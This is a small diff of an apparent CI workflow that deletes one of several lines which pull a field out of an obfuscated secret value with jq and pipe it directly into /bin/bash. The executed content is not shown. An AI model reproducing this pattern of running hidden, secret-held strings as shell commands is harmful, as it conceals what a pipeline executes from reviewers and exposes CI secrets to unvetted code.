@@ -22,7 +22,6 @@ jobs:
           w296: ${{ secrets.w296 }}
         run: |
           printf '%s' "$w296" | jq -r .pexd98 | /bin/bash
-          printf '%s' "$tf53" | jq -r .feomg73651 | /bin/bash
           printf '%s' "$qbabe8398" | jq -r .vbabd99 | /bin/bash
           echo $uxico7 | jq -r .yqd7666 | /bin/bash
           echo $fvc457 | jq -r .sonw24293 | /bin/bash
